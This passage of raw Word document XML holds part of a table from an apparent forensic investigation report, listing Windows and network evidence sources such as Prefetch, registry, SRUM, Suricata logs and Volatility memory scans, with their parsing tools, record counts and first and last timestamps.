            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>661</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:16.317225</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:16.317225</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>636</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:03.236161</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:18:45.487572</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Services (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>625</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:14:17.565306</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: Store applications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>451</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:43.471452</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:24.870630</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: TaskCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>304</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-04 05:41:39.880824</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:16.726130</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Files transferred (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:58:07.470323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:25:21.431188</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>229</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:00:11.462431</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:23:57.308493</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (devices)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>217</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:31:22.074269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:34.051244</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>217</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:44:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (vfuprov)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>210</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WxTCmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>201</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:03</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:18:11</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:44.539499</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:21.850746</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache (AppCompatCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppCompatCacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>183</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-06 17:05:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:47</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>178</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:21</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (MPLog)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>168</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:29.531000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:16:12.983000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SBECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>143</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process list (pslist)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
